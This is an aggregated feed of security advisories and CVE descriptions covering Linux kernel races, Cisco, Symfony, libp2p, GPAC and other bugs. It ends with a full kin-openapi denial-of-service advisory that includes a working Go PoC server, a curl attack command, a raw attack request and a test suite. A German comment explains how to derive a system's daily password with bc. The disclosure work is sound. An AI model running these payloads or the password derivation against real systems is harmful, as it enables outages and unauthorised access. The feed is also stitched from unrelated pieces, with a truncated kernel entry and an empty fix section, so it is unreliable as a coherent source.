A vulnerability in the Advanced Malware Protection (AMP) feature of Cisco Secure Email Gateway could allow an unauthenticated, remote attacker to write arbitrary files on the underlying operating system.

This vulnerability is due to improper handling of email attachments when the file reputation service is enabled. An attacker could exploit this vulnerability by sending an email that contains a crafted attachment through an affected device. A successful exploit could allow the attacker to write arbitrary files and execute commands with root privileges on the underlying operating system.

CVE-2026-89754.description:
In the Linux kernel, the following vulnerability has been resolved:

mm/pagewalk: fix stale walk->action escaping walk_pmd_range()

If ->pmd_entry() sets walk->action = ACTION_AGAIN, the pmd_none() check is
retried.  The PMD entry may be cleared at the point of retry.

In this case, if walk->ops->install_pte is not specified, the code
continues to the next PMD entry in the range without resetting
walk->action to ACTION_SUBTREE.

This leaves walk->action erroneously set to ACTION_AGAIN, which is
incorrect.

This was incorrect but not problematic up until commit 3b89863c3fa4
("mm/pagewalk: fix race between concurrent split and refault") which
updated walk_pud_range() to check for walk->action == ACTION_AGAIN upon
walk_pmd_range()'s return, causing the PUD walk to be retried.

In this case this results in duplicate walk callbacks being invoked,
which is erroneous and will break any caller that is not idempotent

CVE-2026-97941.description:
In the Linux kernel, the following vulnerability has been resolved:

mm/slab: take n->list_lock in __slab_try_return_freelist() to avoid race

Commit ba7425312607 ("mm, slab: add an optimistic
__slab_try_return_freelist()") incorrectly assumed that nobody has freed
an object to the slab as long as slab->freelist is NULL and cmpxchg
succeeds.

However, as reported by Hyunwoo Kim [1], other CPUs might have freed
an object to the slab, insert the slab to the partial list, then
allocated an object from the slab, and be in the middle of removing
the slab from the list under n->list_lock.

Since __refill_objects_node() puts the slab back on pc.slabs
outside n->list_lock, it might insert the slab into that list while
the slab is concurrently being removed from n->partial.
This led to a list corruption [1]:

  list_add corruption. next->prev should be prev
  (ffff888100000248), but was dead000000000122.
  (next=ffffea000416e410).
  kernel BUG at lib/list_debug.c:29!
  Oops: invalid opcode: 0000 [#1] SMP NOPTI
  CPU: 1 UID: 65534 PID: 144 Comm: poc Not tainted
  7.2.0-16172-gcf72cbb39da8-dirty #1 PREEMPT(lazy)
  RIP: 0010:__list_add_valid_or_report+0x80/0xd0
  ...
  Call Trace:
   alloc_from_new_slab+0x183/0x300
   ___slab_alloc+0x31c/0x890
   __kmalloc_noprof+0x3d4/0x800
   lsm_blob_alloc+0x2d/0x50
   security_msg_msg_alloc+0x26/0x90
   load_msg+0x1aa/0x210
   do_msgsnd+0x91/0x800
   do_syscall_64+0x109/0x5d0
   entry_SYSCALL_64_after_hwframe+0x77/0x7f
  ...
  Kernel panic - not syncing: Fatal exception

This is a classic ABA problem where cmpxchg succeeds but the state has
changed since __refill_objects_node() took the freelist from the slab.

As Vlastimil Babka mentioned [2], it should be rare to return more than
one slab (due to the racy read of slab->counters in
get_partial_node_bulk()). Therefore, instead of introducing additional
complexity, acquire and release n->list_lock twice in the worst case.

Return the slab directly to the partial list and hold n->list_lock
across the cmpxchg and add_partial(). This is similar to the initial
version of commit ba7425312607 [3]. This is enough to avoid the race as
the list manipulation is serialized by n->list_lock. While at it,
bring back unlikely() hint now that the condition is unlikely.

CVE-2026-98385.description:
In the Linux kernel, the following vulnerability has been resolved:

sched/cache: Decouple sched_cache_group from mm to fix UAF

Currently the sched cache grouping is by mm and the scheduling statistics
sched_cache_stat lives in the mm structure.  This ties the life cycle
of scheduling stats with mm.

In account_mm_sched(), the scheduling stats are accessed by
task->mm->sc_stat.  However, a task may be switching mm on one CPU when
another CPU is running account_mm_sched(), and possibly accessing the
old mm that was freed.  This problem was found when running tests with
KASAN by Hyunwoo:

  https://lore.kernel.org/lkml/apPb-Dr4nPYuHQOK@v4bel/

Instead of serializing the mm access by introducing extra acquisition of
rq lock in the mm free path, extract sched_cache_stat from mm_struct,
rename it as sched_cache_group and manage its life cycle apart from
mm_struct with its own ref counting.  This allows us in the next patch
access sched_cache_group directly from task, and add a refcount
on sched_cache_group when a task links to it. This prevents the use
after free issue when accessing stale and released old mm and its
sched cache stat a task switches to a new mm while account_mm_sched()
is done elsewhere.

The other benefit of this restructure is in the future, the grouping of
tasks to a LLC would have the flexibility to be associated with a user
defined grouping, or cgroup, cookie group, numa_group or others instead
of just with a single mm address space.

Rename sched_cache_stat to sched_cache_group and turn it into a refcounted
object allocated from mm_struct.  The mm_struct now holds a pointer
(sched_cache_grp) to this object instead of embedding it.

CVE-2026-80775.description:
In the Linux kernel, the following vulnerability has been resolved:

futex: Fix race on the initial mm->futex.phash.ref allocation

futex_hash_allocate() allocates mm->futex.phash.ref without any locking.
Commit d9b05321e21e ("futex: Move futex_hash_free() back to __mmput()")
moved the allocation here and assumed that the process has just a single
thread at this point.

Commit ee9dce44362b ("futex: Drop CLONE_THREAD requirement for private
default hash alloc") widened need_futex_hash_allocate_default() to cover
any CLONE_VM clone, but left out vfork because the parent is suspended and
cannot race.

That no longer holds once vfork is nested. If a vfork child calls vfork
again and is then killed with SIGKILL, the parent is released from its
vfork wait and runs concurrently with the grandchild in the same mm.
Neither of them went through futex_hash_allocate_default().

When both call prctl(PR_FUTEX_HASH, PR_FUTEX_HASH_SET_SLOTS) at the same
time, each one sees mm->futex.phash.ref as NULL and stores its own percpu
counter. Only the last store survives. The counter stored first is no
longer reachable from the mm, so the references on it are not seen by
__futex_ref_atomic_end(). A private hash that still has references is then
considered dead and freed, and a task that still holds one of its buckets
writes into freed memory in futex_q_lock().

Store the counter once with cmpxchg() and let the loser free_percpu() its
own. The initial reference has to be taken before the store, otherwise
another task can install a private hash while the counter is still 0.

CVE-2026-98256.description:
In the Linux kernel, the following vulnerability has been resolved:

signal: Prevent exec() race

Hyunwoo debugged the following KASAN UAF splat:

  BUG: KASAN: slab-use-after-free in __send_signal_locked+0xb27/0xba0
  Write of size 8 at addr ffff888007ed80c8 by task poc/79
  ...
  Call Trace:
   __send_signal_locked+0xb27/0xba0
   do_send_sig_info+0xa7/0x160
   do_send_specific+0x76/0xa0
   __x64_sys_tgkill+0x193/0x270
  ...
  Allocated by task 80:
   do_timer_create+0x1a4/0x1030
   __x64_sys_timer_create+0x145/0x190
  ...
  Freed by task 12:
   kmem_cache_free_bulk+0x1f8/0x4a0
   kvfree_rcu_bulk+0x14f/0x1c0
   kfree_rcu_work+0x128/0x1a0
  ...
  Last potentially related work creation:
   kvfree_call_rcu+0x39/0x390
   __flush_itimer_signals+0x211/0x320
   flush_itimer_signals+0x47/0x90
   begin_new_exec+0xa6b/0x28c0

It turned out that this happens with a non-leader exec() as Hyunwoo
explained:

de_thread() calls exchange_tids() before release_task(leader), so the
struct pid held by a SIGEV_THREAD_ID timer created against the leader's tid
now points to the thread which called execve(). pid_task() returns that
thread and lock_task_sighand() on it succeeds.

If the timer signal is blocked, its sigqueue stays queued on the leader's
task::pending. The next expiry of that timer can then run while
release_task() flushes the queue.

posixtimer_send_sigqueue() checks whether the sigqueue is already queued
with a plain list_empty(), which only reads list_head::next.
list_del_init() is not atomic and INIT_LIST_HEAD() stores list_head::next
before list_head::prev, so the check can pass in between. list_add_tail()
queues the entry on the task::pending of the live thread, and the
list_head::prev store from the flush then overwrites the list_head::prev
link that list_add_tail() has just set.

__flush_itimer_signals() does not undo that either. With list_head::prev
pointing at the entry itself, its list_del_init() only stores the same
values again, so the entry is not removed from the list. It is still there
after the last reference is dropped and the timer is freed by RCU, and the
list_add_tail() of a later tgkill() follows that list_head::prev into the
freed timer.

This problem surfaced with the recent commit which moved the sigqueue flush
out of the sighand lock held region.

Hyonwoo proposed to fix this by using list_del_init_careful(), but that
just papers over the problem. After some disucssions and various attempts
to solve it, Eric pointed out that there is no reason to flush
task::pending late in release_task() and it should be done in
exit_signals() already.

As nothing can collect and deliver signals which are queued in a dying
task's pending queue, there is no reason to delay it further.

But it has to be ensured that no signals can be queued into it after that
point. exit_signals() sets PF_EXITING in task::flags, which can be used as
an indicator for this.

Cure it by:

  - Preventing signal queueing for task private signals (PIDTYPE_PID) when
    the task has PF_EXITING set in __send_signal_locked() and in
    posixtimer_send_sigqueue().

  - Protecting the unlocked setting of PF_EXITING in exit_signals() for the
    task group empty and the group exit case with sighand lock

  - Flushing task::pending signals right there.

    Optimize that by moving the whole pending list to an on-stack list head
    under sighand lock and free the signals without the lock held.

There has been quite some discussion about the lockless flush and the
non-leader exec case on weakly ordered systems. The problem is that a third
party which tries to send a posix timer signal relies on the PID lookup to
find the target task and that lookup might result in the new leader when
the signal was originaly directed to the old leader. In case that the
signal was queued on the old leader then the lockless flush raised a
concern over the following situation:

   old_leader		new_leader              third party

A: flush_list()	// list_del_in

CVE-2026-59970.description: Tandoor Recipes is an application for managing recipes, planning meals, and building shopping lists. Prior to 2.6.10, passes an administrator-controlled AI provider URL directly to LiteLLM without applying the server's outbound-request SSRF checks when an authenticated user creates a Space, configures an AI provider with a URL targeting an internal address, and invokes an AI action. In cookbook/views/api.py, the affected AI actions call completion through TARGET/api/ai-import/ and api/ai-step-sort/ while bypassing safe_request. The attack works because the server connects to the supplied provider URL from each AI action and exposes connection success, refusal, or timeout as a blind network-reachability oracle. This can reach internal services, other hosts on the server network, and cloud metadata endpoints and map reachable internal hosts and ports. This issue is fixed in version 2.6.10.

CVE-2026-30971.description: ZoneMinder is a free, open source closed-circuit television software application. Prior to 1.39.2, 1.38.2, and 1.36.40, ZoneMinder interpolates an unvalidated monitor Device field into shell commands in PHP and Perl control paths when an authenticated user with monitor-create or monitor-edit permission saves a Local monitor whose Device Path contains shell metacharacters and the monitor control or startup path runs. In this attack mechanism, the stored Device value reaches Perl qx() and backtick execution before zmdc.pl argument detainting, while separate PHP command paths use bypassable escapeshellcmd defenses. The attacker can execute arbitrary commands as the web server user. This vulnerability is fixed in 1.39.2, 1.38.2, and 1.36.40.

🚨 PoC published for a critical unauthenticated WordPress Theme My Login account takeover vulnerability; CVE-2026-89079

PoC: https://github.com/murrez/CVE-2026-89079

The flaw affects WordPress multisite installations using Theme My Login with user-chosen registration passwords enabled. Under the required configuration, an unauthenticated attacker can abuse the lost-password flow to overwrite another user's password and take over the account.

CVSS: 9.8 Critical
Affected: Theme My Login ≤ 7.2.1
Fixed: Theme My Login ≥ 7.2.2

Exploitation is configuration-dependent and requires WordPress multisite with the tml_user_passwords network option enabled. The PoC includes target checking, verification, bulk scanning, and an exploit mode that validates successful account access.

CVE-2026-89079.description: The Theme My Login plugin for WordPress is vulnerable to privilege escalation via account takeover in versions up to, and including, 7.2.1. This is due to the plugin not properly validating a user's identity prior to updating their password. This makes it possible for unauthenticated attackers to change arbitrary user's passwords on multi-site setups in certain configurations.

Security Advisory: CVE-2025-60479 - NULL Pointer Dereference in GPAC/MP4Box

Processing a crafted MPEG-4 file with broken BIFS vector fields triggers a NULL pointer dereference in `StatSFVec2f`, causing MP4Box to crash during scene statistics collection.

Security Advisory: CVE-2025-60491 - Use-After-Free in GPAC/MP4Box

Processing a crafted MPEG-2 TS file with corrupted PMT descriptors triggers a heap use-after-free in `dasher_flush_segment`, causing MP4Box to crash during DASH segmentation.

Summary:
The `dasher_configure_pid` function in `filters/dasher.c` frees a PID context structure at line 986 when reconfiguring a stream from a crafted MPEG-TS input. The freed pointer is not nullified, and `dasher_flush_segment` subsequently reads 4 bytes at offset 336 within that freed 1096-byte region at line 8062 during the segment flush cycle, constituting a heap-use-after-free.

CWE:
CWE-416 - Use After Free

Affected Component:
```
filters/dasher.c:8062
Function: dasher_flush_segment()
```

Affected Product:
MP4Box (GPAC Multimedia Open Source Project)

Affected Version:
2.5-DEV-rev1698-gfc2009fa7-master; commit `fc2009fa75631960743f8f7855dda8998167b5ab`. Any codebase equivalent to this commit that has not applied the fix commit is affected.

Attack Conditions:
An attacker supplies a crafted MPEG-2 TS file containing broken PMT descriptor sizes, reused PIDs, and sync marker violations. Local access is required; the victim must invoke `MP4Box -dash 1000 <crafted_file>` or any equivalent DASH segmentation command that triggers PID reconfiguration in the dasher module.

Impact:
The use-after-free (READ of size 4 at 336 bytes into a freed 1096-byte heap region) causes process termination, resulting in Denial of Service. Code execution cannot be ruled out; use-after-free vulnerabilities allow an attacker to control freed memory contents and potentially redirect execution flow.

Fix / mitigation status:

CVE-2026-48503.description: libIEC61850 is an open-source implementation of IEC 61850 client and server protocols including MMS, GOOSE, Sampled Values, and R-Session. Prior to 1.6.2, the MMS file service in src/mms/iso_mms/server/mms_file_service.c accepts an out-of-range initialPosition in fileOpen and stores it in the file-read state. The fileRead path then subtracts the larger read position from the file size using unsigned arithmetic and fails to limit the response to the actual FileSystem_readFile return value. The oversized response can include stale bytes from the reused connection buffer after the requested file contents, disclosing prior response data and protocol fragments to an unauthenticated remote client when the file service is enabled. This issue is fixed in version 1.6.2.

posts.content: CVE-2026-108082: Symfony ReDoS. One request. Seconds of CPU https://r3verii.github.io/cve/2026/10/16/symfony-cache-control-redos.html

CVE-2026-108082.description:
Symfony is a PHP framework for web and console applications and a set of reusable PHP components. Prior to versions 5.4.54, 6.4.46, 7.4.19, and 8.1.7, HeaderUtils::split() parsed header values with a pattern whose token alternative also matched whitespace, followed by a (?<!\s) lookbehind. A run of whitespace placed before a separator could be divided among the iterations of the enclosing repetition in exponentially many ways, and the engine tried all of them before settling. HeaderBag calls it for the Cache-Control header whenever a Request is built, so any application handling HTTP requests is reachable, with no authentication.



A single request carrying such a header costs close to a second of CPU (813 ms for a run of 17 spaces in an 8 KB header on PHP 8.5, doubling with each extra space). From 18 spaces on, preg_match_all() gives up at pcre.backtrack_limit and split() returns an empty array, so every directive of the header is silently dropped.



This issue affects symfony/http-foundation v4.1.0-BETA1 through v5.4.53, v6.0.0-BETA1 through v6.4.45, v7.0.0-BETA1 through v7.4.18, and v8.0.0-BETA1 through v8.1.6.

@HonkHase
Es ist nicht das Datum selbst, sondern eine leichte Abwandlung.

Mit dem auf vielen Unix-Linuxsystemen standardnässig verfügbaren Uralt-Kommandozeilen-Taschenrechner lässt sich das Passwort für gestern mit folgenden zwri Eingabezeilen errechnen:

ibase=16
10152610 / 15

Die "10", "15" und "26" oben sind Monat, Tag und Jahr; `ibase=16` sagt, dass die als Hex- statt Dezimalsequenzen zu interpretieren seien. Das Passwort sind die letzten 5 Ziffern des Resultats.

* The vulnerability does not include the capability to enumerate or list directory contents.

libp2p is a JavaScript implementation of the libp2p networking stack. Prior to 6.0.28, the @libp2p/webrtc webRTCDirect() Node.js listener processes unauthenticated STUN Binding Requests before PeerId authentication, Noise, muxing, protocol negotia...

CVE-2026-103936.description: libp2p is a JavaScript implementation of the libp2p networking stack. Prior to 6.0.28, the @libp2p/webrtc webRTCDirect() Node.js listener processes unauthenticated STUN Binding Requests before PeerId authentication, Noise, muxing, protocol negotiation, connection creation, or connection-manager admission. The listener in packages/transport-webrtc/src/private-to-public/utils/stun-listener.ts forwards the packet-controlled request.ufrag into DirectRTCPeerConnection.setLocalDescription, where the value is reused as an ICE password without validating its required length and character set. A short credential causes node-datachannel or libdatachannel to raise an uncaught native invalid_argument and abort the process with SIGABRT, allowing a single remote UDP packet to deny service. The confirmed impact is process termination only, with no demonstrated memory corruption, code execution, browser impact, confidentiality impact, integrity impact, or connection-limit bypass. This issue is fixed in version 6.0.28.

🟠 CVE-2026-97394 - High (7.5)

kin-openapi is a Go project for handling OpenAPI files. From 0.136.0 until 0.143.0, openapi3filter accepts OpenAPI 3.1 array schemas without an items keyword and then dereferences the nil Schema.Items value while decoding application/x-www-form-ur...

🔗 https://www.thehackerwire.com/vulnerability/CVE-2026-97394/

#CVE #vulnerability #infosec #cybersecurity #security #Tenda #patchstack

CVE-2026-97394.description:
### Summary

A nil-pointer dereference in `openapi3filter` lets any unauthenticated client crash a request handler with a single HTTP request against an OpenAPI **3.1** operation that declares `type: array` **without** `items`. OpenAPI 3.1 (JSON Schema 2020-12) permits omitting `items`, and `doc.Validate()` accepts such schemas with `Schema.Items == nil`. Request/response decoders then dereference `Items` with no nil check. The panic is **deterministic (100%)** on every request to the affected operation. There is no `recover()` in `openapi3filter`; under handlers without per-request recover the process can exit.

### Details

**Spec-validation asymmetry.** OpenAPI 3.0 rejects array schemas that omit `items` ([`openapi3/schema.go`](https://github.com/getkin/kin-openapi/blob/master/openapi3/schema.go) around the `TypeArray` / `newSchemaItemsRequired` branch). For OpenAPI 3.1, `T.Validate` enables `jsonSchema2020ValidationEnabled`, so that check is skipped and `Schema.Items` remains nil after a clean `doc.Validate()`.

**Vulnerable decoder.** The primary request-side crash is in [`UrlencodedBodyDecoder`](https://github.com/getkin/kin-openapi/blob/master/openapi3filter/req_resp_decoder.go) (still present on this checkout at L1421):

```go
case propType.Is("array"):
    items := propSchema.Value.Items.Value  // Items == nil → panic
```

This runs during schema inspection **before** form values are parsed. Any non-empty `application/x-www-form-urlencoded` body for the operation reaches the dereference (an empty body is rejected earlier when `requestBody.required` is true, and never enters the decoder).

The same nil `Items` also crashes:

| Path | Location | Trigger |
|---|---|---|
| `MultipartBodyDecoder` | `req_resp_decoder.go` ~1564 → 1579 | `multipart/form-data` part named like the array property |
| `parseArray` → `parsePrimitive` | `req_resp_decoder.go` ~1129 / 1151 | Array-typed **response headers** via `ValidateResponse`, and path/cookie array params |

`Middleware` / `ValidationHandler` call `ValidateRequest` / `ValidateResponse` directly with no recover, so the panic escapes the library into the application.

**Recommended fix.** Guard nil `Items` and return a structured decode/validation error, e.g.:

```diff
 case propType.Is("array"):
+	if propSchema.Value.Items == nil || propSchema.Value.Items.Value == nil {
+		return nil, fmt.Errorf("unsupported schema of request body's property %q: array items required for decoding", propName)
+	}
 	items := propSchema.Value.Items.Value
```

Apply equivalent guards in `MultipartBodyDecoder` and `parseArray` before calling `parsePrimitive`.

### PoC

Verified against revision `c11a4812ba7be3ee3d81453be0c397ee84c238d5`, Go 1.25, `darwin/arm64`.

**1. Spec** — OpenAPI 3.1 operation with urlencoded body and `type: array` property without `items`:

```yaml
openapi: 3.1.0
info: {title: t, version: 1.0.0}
paths:
  /f:
    post:
      requestBody:
        required: true
        content:
          application/x-www-form-urlencoded:
            schema:
              type: object
              properties:
                tags: {type: array}
      responses:
        '200': {description: ok}
```

**2. E2E program** — `net/http` server using the same public entrypoint (`gorillamux` → `openapi3filter.ValidateRequest`) real middleware uses. Save as `main.go` in a module that depends on `github.com/getkin/kin-openapi` at a vulnerable revision, then `go run .`:

```go
package main

import (
	"fmt"
	"log"
	"net/http"
	"strings"

	"github.com/getkin/kin-openapi/openapi3"
	"github.com/getkin/kin-openapi/openapi3filter"
	"github.com/getkin/kin-openapi/routers/gorillamux"
)

const spec = `
openapi: 3.1.0
info: {title: t, version: 1.0.0}
paths:
  /f:
    post:
      requestBody:
        required: true
        content:
          application/x-www-form-urlencoded:
            schema:
              type: object
              properties:
                tags: {type: array}
      responses:
        '200': {description: ok}
`

func main() {
	loader := openapi3.NewLoader()
	doc, err := loader.LoadFromData([]byte(spec))
	if err != nil {
		log.Fatal(err)
	}
	if err := doc.Validate(loader.Context); err != nil {
		log.Fatalf("doc.Validate rejected (unexpected for 3.1): %v", err)
	}
	fmt.Println("SPEC_ACCEPTED; Items ==", doc.Paths.Value("/f").Post.RequestBody.Value.
		Content.Get("application/x-www-form-urlencoded").Schema.Value.Properties["tags"].Value.Items)

	router, err := gorillamux.NewRouter(doc)
	if err != nil {
		log.Fatal(err)
	}

	// Direct call (no net/http recover): proves the library itself panics.
	req, _ := http.NewRequest(http.MethodPost, "/f", strings.NewReader("tags=a"))
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	route, pp, _ := router.FindRoute(req)
	func() {
		defer func() {
			if r := recover(); r != nil {
				fmt.Printf("DIRECT_PANIC: %v\n", r)
			}
		}()
		_ = openapi3filter.ValidateRequest(loader.Context, &openapi3filter.RequestValidationInput{
			Request: req, PathParams: pp, Route: route,
			Options: &openapi3filter.Options{AuthenticationFunc: openapi3filter.NoopAuthenticationFunc},
		})
		fmt.Println("DIRECT_PANIC: none (unexpected)")
	}()

	mux := http.NewServeMux()
	mux.HandleFunc("/f", func(w http.ResponseWriter, r *http.Request) {
		route, pathParams, err := router.FindRoute(r)
		if err != nil {
			http.Error(w, err.Error(), http.StatusNotFound)
			return
		}
		err = openapi3filter.ValidateRequest(r.Context(), &openapi3filter.RequestValidationInput{
			Request: r, PathParams: pathParams, Route: route,
			Options: &openapi3filter.Options{AuthenticationFunc: openapi3filter.NoopAuthenticationFunc},
		})
		if err != nil {
			http.Error(w, err.Error(), http.StatusBadRequest)
			return
		}
		w.WriteHeader(http.StatusOK)
		_, _ = w.Write([]byte("ok\n"))
	})

	addr := "127.0.0.1:8085"
	fmt.Printf("listening on http://%s/f\n", addr)
	fmt.Println("attack: curl -X POST -H 'Content-Type: application/x-www-form-urlencoded' --data 'tags=a' http://" + addr + "/f")
	log.Fatal(http.ListenAndServe(addr, mux))
}
```

**3. Observed output** (`go run .`):

```
SPEC_ACCEPTED; Items == <nil>
DIRECT_PANIC: runtime error: invalid memory address or nil pointer dereference
listening on http://127.0.0.1:8085/f
```

Then:

```
curl -X POST -H 'Content-Type: application/x-www-form-urlencoded' --data 'tags=a' http://127.0.0.1:8085/f
```

Server log:

```
http: panic serving 127.0.0.1:…: runtime error: invalid memory address or nil pointer dereference
… openapi3filter.UrlencodedBodyDecoder …/req_resp_decoder.go:1421
… openapi3filter.ValidateRequest …
```

Stack pins the fault to `UrlencodedBodyDecoder` at `req_resp_decoder.go:1421`, called from `ValidateRequest` → `ValidateRequestBody` → `decodeBody`.

**Attack request:**

```
POST /f HTTP/1.1
Host: victim
Content-Type: application/x-www-form-urlencoded

tags=a
```

(Any non-empty body is enough; form content is irrelevant because `Items` is dereferenced during schema inspection before parsing.)

**4. Regression / multi-surface test suite** — save as e.g. `openapi3filter/array_items_nil_panic_test.go` in a checkout of the module and run `go test -run TestArrayItemsNilPanic ./openapi3filter/ -v`:

```go
package openapi3filter_test

import (
	"bytes"
	"context"
	"fmt"
	"io"
	"mime/multipart"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"

	"github.com/stretchr/testify/require"

	"github.com/getkin/kin-openapi/openapi3"
	"github.com/getkin/kin-openapi/openapi3filter"
	"github.com/getkin/kin-openapi/routers/gorillamux"
)

const urlencodedSpec31 = `
openapi: 3.1.0
info: {title: t, version: 1.0.0}
paths:
  /f:
    post:
      requestBody:
        required: true
        content:
          application/x-www-form-urlencoded:
            schema:
              type: object
              properties:
                tags: {type: array}
      responses:
        '200': {description: ok}
`

const urlencodedSpec30 = `
openapi: 3.0.3
info: {title: t, version: 1.0.0}
paths:
  /f:
    post:
      requestBody:
        required: true
        content:
          application/x-www-form-urlencoded:
            schema:
              type: object
              properties:
                tags: {type: array}
      responses:
        '200': {description: ok}
`

const multipartSpec31 = `
openapi: 3.1.0
info: {title: t, version: 1.0.0}
paths:
  /upload:
    post:
      requestBody:
        required: true
        content:
          multipart/form-data:
            schema:
              type: object
              properties:
                tags: {type: array}
      responses:
        '200': {description: ok}
`

const responseHeaderSpec31 = `
openapi: 3.1.0
info: {title: t, version: 1.0.0}
paths:
  /hdr:
    get:
      responses:
        '200':
          description: ok
          headers:
            X-Tags:
              schema: {type: array}
`

func catchPanic(fn func()) (panicValue any) {
	defer func() { panicValue = recover() }()
	fn()
	return nil
}

func TestArrayItemsNilPanic_OpenAPI31Accepts(t *testing.T) {
	loader := openapi3.NewLoader()
	doc, err := loader.LoadFromData([]byte(urlencodedSpec31))
	require.NoError(t, err)
	require.NoError(t, doc.Validate(loader.Context))
	schema := doc.Paths.Value("/f").Post.RequestBody.Value.Content.
		Get("application/x-www-form-urlencoded").Schema.Value.Properties["tags"].Value
	require.True(t, schema.Type.Is("array"))
	require.Nil(t, schema.Items)
}

func TestArrayItemsNilPanic_OpenAPI30Rejects(t *testing.T) {
	loader := openapi3.NewLoader()
	doc, err := loader.LoadFromData([]byte(urlencodedSpec30))
	require.NoError(t, err)
	require.Error(t, doc.Validate(loader.Context))
}

func TestArrayItemsNilPanic_UrlencodedValidateRequest(t *testing.T) {
	loader := openapi3.NewLoader()
	doc, err := loader.LoadFromData([]byte(urlencodedSpec31))
	require.NoError(t, err)
	require.NoError(t, doc.Validate(loader.Context))
	router, err := gorillamux.NewRouter(doc)
	require.NoError(t, err)

	req, err := http.NewRequest(http.MethodPost, "/f", strings.NewReader("tags=a"))
	require.NoError(t, err)
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	route, pathParams, err := router.FindRoute(req)
	require.NoError(t, err)

	got := catchPanic(func() {
		_ = openapi3filter.ValidateRequest(loader.Context, &openapi3filter.RequestValidationInput{
			Request: req, PathParams: pathParams, Route: route,
			Options: &openapi3filter.Options{AuthenticationFunc: openapi3filter.NoopAuthenticationFunc},
		})
	})
	require.NotNil(t, got)
	require.Contains(t, fmt.Sprint(got), "nil pointer dereference")
}

func TestArrayItemsNilPanic_MultipartValidateRequest(t *testing.T) {
	loader := openapi3.NewLoader()
	doc, err := loader.LoadFromData([]byte(multipartSpec31))
	require.NoError(t, err)
	require.NoError(t, doc.Validate(loader.Context))
	router, err := gorillamux.NewRouter(doc)
	require.NoError(t, err)

	var buf bytes.Buffer
	w := multipart.NewWriter(&buf)
	require.NoError(t, w.WriteField("tags", "a"))
	require.NoError(t, w.Close())

	req, err := http.NewRequest(http.MethodPost, "/upload", &buf)
	require.NoError(t, err)
	req.Header.Set("Content-Type", w.FormDataContentType())
	route, pathParams, err := router.FindRoute(req)
	require.NoError(t, err)

	got := catchPanic(func() {
		_ = openapi3filter.ValidateRequest(loader.Context, &openapi3filter.RequestValidationInput{
			Request: req, PathParams: pathParams, Route: route,
			Options: &openapi3filter.Options{AuthenticationFunc: openapi3filter.NoopAuthenticationFunc},
		})
	})
	require.NotNil(t, got)
	require.Contains(t, fmt.Sprint(got), "nil pointer dereference")
}

func TestArrayItemsNilPanic_ResponseHeaderValidateResponse(t *testing.T) {
	loader := openapi3.NewLoader()
	doc, err := loader.LoadFromData([]byte(responseHeaderSpec31))
	require.NoError(t, err)
	require.NoError(t, doc.Validate(loader.Context))
	router, err := gorillamux.NewRouter(doc)
	require.NoError(t, err)

	req, err := http.NewRequest(http.MethodGet, "/hdr", nil)
	require.NoError(t, err)
	route, pathParams, err := router.FindRoute(req)
	require.NoError(t, err)

	got := catchPanic(func() {
		_ = openapi3filter.ValidateResponse(loader.Context, &openapi3filter.ResponseValidationInput{
			RequestValidationInput: &openapi3filter.RequestValidationInput{
				Request: req, PathParams: pathParams, Route: route,
				Options: &openapi3filter.Options{AuthenticationFunc: openapi3filter.NoopAuthenticationFunc},
			},
			Status: http.StatusOK,
			Header: http.Header{"X-Tags": []string{"a,b"}},
			Body:   io.NopCloser(strings.NewReader("")),
		})
	})
	require.NotNil(t, got)
	require.Contains(t, fmt.Sprint(got), "nil pointer dereference")
}

func TestArrayItemsNilPanic_E2EHTTPServer(t *testing.T) {
	loader := openapi3.NewLoader()
	doc, err := loader.LoadFromData([]byte(urlencodedSpec31))
	require.NoError(t, err)
	require.NoError(t, doc.Validate(loader.Context))
	router, err := gorillamux.NewRouter(doc)
	require.NoError(t, err)

	var panicCount int
	mux := http.NewServeMux()
	mux.HandleFunc("/f", func(w http.ResponseWriter, r *http.Request) {
		defer func() {
			if recover() != nil {
				panicCount++
				http.Error(w, "panic in ValidateRequest", http.StatusInternalServerError)
			}
		}()
		route, pathParams, err := router.FindRoute(r)
		require.NoError(t, err)
		err = openapi3filter.ValidateRequest(r.Context(), &openapi3filter.RequestValidationInput{
			Request: r, PathParams: pathParams, Route: route,
			Options: &openapi3filter.Options{AuthenticationFunc: openapi3filter.NoopAuthenticationFunc},
		})
		if err != nil {
			http.Error(w, err.Error(), http.StatusBadRequest)
			return
		}
		w.WriteHeader(http.StatusOK)
	})

	srv := httptest.NewServer(mux)
	t.Cleanup(srv.Close)

	const n = 5
	for i := 0; i < n; i++ {
		resp, err := http.Post(srv.URL+"/f", "application/x-www-form-urlencoded", strings.NewReader("tags=a"))
		require.NoError(t, err)
		_, _ = io.ReadAll(resp.Body)
		_ = resp.Body.Close()
		require.Equal(t, http.StatusInternalServerError, resp.StatusCode)
	}
	require.Equal(t, n, panicCount)
}

func TestArrayItemsNilPanic_Deterministic(t *testing.T) {
	loader := openapi3.NewLoader()
	doc, err := loader.LoadFromData([]byte(urlencodedSpec31))
	require.NoError(t, err)
	require.NoError(t, doc.Validate(loader.Context))
	router, err := gorillamux.NewRouter(doc)
	require.NoError(t, err)

	const attempts = 50
	panics := 0
	for i := 0; i < attempts; i++ {
		req, err := http.NewRequest(http.MethodPost, "/f", strings.NewReader("tags=x"))
		require.NoError(t, err)
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		route, pathParams, err := router.FindRoute(req)
		require.NoError(t, err)
		if catchPanic(func() {
			_ = openapi3filter.ValidateRequest(context.Background(), &openapi3filter.RequestValidationInput{
				Request: req, PathParams: pathParams, Route: route,
				Options: &openapi3filter.Options{AuthenticationFunc: openapi3filter.NoopAuthenticationFunc},
			})
		}) != nil {
			panics++
		}
	}
	require.Equal(t, attempts, panics)
}
```

**Observed results on the vulnerable tree:**

- 3.1 accepts the schema (`Items == nil`); 3.0 rejects it
- urlencoded, multipart, and response-header paths all panic with `nil pointer dereference`
- **50/50** panic rate (100% deterministic)
- E2E httptest server: **5/5** POSTs panic inside `ValidateRequest` → HTTP 500

### Impact

- **Type:** NULL Pointer Dereference → **unauthenticated remote denial of service**.
- **Who is impacted:** applications using `github.com/getkin/kin-openapi/openapi3filter` to validate requests/responses against OpenAPI **3.1** documents that contain an `items`-less `type: array` in a urlencoded or multipart body property, or an array-typed response header (or other `parseArray` surfaces). Specs may be author mistakes, codegen output, or attacker-supplied where untrusted documents are loaded — `doc.Validate()` does **not** reject them under 3.1.
- **Attack:** a single unauthenticated POST (or response-validation hit) with a tiny non-empty body.
